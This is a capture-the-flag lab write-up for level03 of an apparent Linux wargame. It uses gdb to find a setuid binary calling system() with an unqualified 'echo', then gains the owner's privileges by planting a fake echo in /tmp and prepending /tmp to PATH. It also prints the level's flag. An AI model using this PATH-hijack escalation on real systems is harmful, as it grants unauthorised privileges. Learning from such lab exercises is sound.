# Step1
executable `level03` is presents in the home directory

```bash
ls -l
```

### Result

`-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03`

- The owner is `flag03`
- The `s` permission is set, so it will run with the owner's permission
- Runnig it display `Exploit me`

# Step 2

with `gdb` we will analyze the binary

```bash
gdb level03
(gdb) break main
(gdb) run
(gdb) disas
(gdb) next
```

`Exploit me` appears on the succession of a `call` instruction and a `movl` instruction:

`0x080484f7 <+83>:	movl   $0x80485e0,(%esp)`

`0x080484fe <+90>:	call   0x80483b0 <system@plt>`



We can see that the `system` function is called with the address `0x80485e0` as argument. So we can print the content of this address to see what is inside.


```bash
(bsd) print (const char *) 0x80485e0
```

Or

```bash
(bsd) x/s 0x80485e0
```

### Result
`0x80485e0:	 "/usr/bin/env echo Exploit me"`

# Step 3

Because the binary is running with the owner's permission, and call the `echo` built-in command.

We can create a fake `echo` command that will execute the `getflag` command by copy the `getflag` binary under the name `echo`(eslewhere and first in the $PATH).

```bash
which getflag
cp /bin/getflag /tmp/echo
export PATH=/tmp:$PATH
./level03
```

### Result
Runnig ./level03 runs fake `echo` as `getflag` with `flag03` user and gives us the flag `qi0maab88jeaj46qoumi7maus`

No password needed for `flag03`
